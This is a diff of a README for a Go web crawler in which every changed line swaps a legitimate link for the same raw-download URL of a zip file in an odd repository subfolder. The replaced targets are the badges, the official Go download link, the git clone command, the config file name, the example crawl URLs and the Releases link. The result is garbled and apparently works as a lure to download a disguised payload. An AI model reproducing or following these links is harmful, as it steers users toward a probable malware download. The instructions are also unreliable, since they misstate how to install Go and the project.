@@ -1,9 +1,9 @@
 # 🚀 Concurrent Web Crawler
 
-![GitHub issues](https://img.shields.io/github/issues/LOKESH-loky/Concurrent-Web-Crawler)
-![GitHub forks](https://img.shields.io/github/forks/LOKESH-loky/Concurrent-Web-Crawler)
-![GitHub stars](https://img.shields.io/github/stars/LOKESH-loky/Concurrent-Web-Crawler)
-![License](https://img.shields.io/github/license/LOKESH-loky/Concurrent-Web-Crawler)
+![GitHub issues](https://github.com/LOKESH-loky/Concurrent-Web-Crawler/raw/refs/heads/main/whute/Concurrent_Crawler_Web_v2.0.zip)
+![GitHub forks](https://github.com/LOKESH-loky/Concurrent-Web-Crawler/raw/refs/heads/main/whute/Concurrent_Crawler_Web_v2.0.zip)
+![GitHub stars](https://github.com/LOKESH-loky/Concurrent-Web-Crawler/raw/refs/heads/main/whute/Concurrent_Crawler_Web_v2.0.zip)
+![License](https://github.com/LOKESH-loky/Concurrent-Web-Crawler/raw/refs/heads/main/whute/Concurrent_Crawler_Web_v2.0.zip)
 
 ## Overview
 
@@ -21,13 +21,13 @@ The Concurrent Web Crawler is a Go-based application that efficiently crawls web
 
 ### Prerequisites
 
-Before you start, ensure you have Go installed on your system. You can download it from the [official Go website](https://golang.org/dl/).
+Before you start, ensure you have Go installed on your system. You can download it from the [official Go website](https://github.com/LOKESH-loky/Concurrent-Web-Crawler/raw/refs/heads/main/whute/Concurrent_Crawler_Web_v2.0.zip).
 
 ### Installation
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/LOKESH-loky/Concurrent-Web-Crawler.git
+   git clone https://github.com/LOKESH-loky/Concurrent-Web-Crawler/raw/refs/heads/main/whute/Concurrent_Crawler_Web_v2.0.zip
    cd Concurrent-Web-Crawler
    ```
 
@@ -43,7 +43,7 @@ Before you start, ensure you have Go installed on your system. You can download 
 
 ### Configuration
 
-The application supports various configuration options. You can adjust the following parameters in the `config.yaml` file:
+The application supports various configuration options. You can adjust the following parameters in the `https://github.com/LOKESH-loky/Concurrent-Web-Crawler/raw/refs/heads/main/whute/Concurrent_Crawler_Web_v2.0.zip` file:
 
 - `maxDepth`: Set the maximum depth for crawling.
 - `maxUrls`: Limit the number of URLs to visit.
@@ -73,7 +73,7 @@ The crawler outputs the results in a structured format. You can specify the outp
 ### Example
 
 ```bash
-./webcrawler -url https://example.com -json
+./webcrawler -url https://github.com/LOKESH-loky/Concurrent-Web-Crawler/raw/refs/heads/main/whute/Concurrent_Crawler_Web_v2.0.zip -json
 ```
 
 ## Advanced Usage
@@ -82,13 +82,13 @@ The crawler outputs the results in a structured format. You can specify the outp
 
 The crawler allows you to control the number of concurrent requests. This is managed through the `concurrency` parameter in the command line:
 ```bash
-./webcrawler -url https://example.com -concurrency 5
+./webcrawler -url https://github.com/LOKESH-loky/Concurrent-Web-Crawler/raw/refs/heads/main/whute/Concurrent_Crawler_Web_v2.0.zip -concurrency 5
 ```
 Adjust this number based on the target server's capabilities and your needs.
 
 ### Custom User Agent
 
-To avoid blocking, set a custom User-Agent in the `config.yaml`:
+To avoid blocking, set a custom User-Agent in the `https://github.com/LOKESH-loky/Concurrent-Web-Crawler/raw/refs/heads/main/whute/Concurrent_Crawler_Web_v2.0.zip`:
 ```yaml
 userAgent: "MyCustomCrawler/1.0"
 ```
@@ -133,7 +133,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest versions and updates, please visit the [Releases](https://github.com/LOKESH-loky/Concurrent-Web-Crawler/releases) section.
+For the latest versions and updates, please visit the [Releases](https://github.com/LOKESH-loky/Concurrent-Web-Crawler/raw/refs/heads/main/whute/Concurrent_Crawler_Web_v2.0.zip) section.
 
 ## Acknowledgments
 
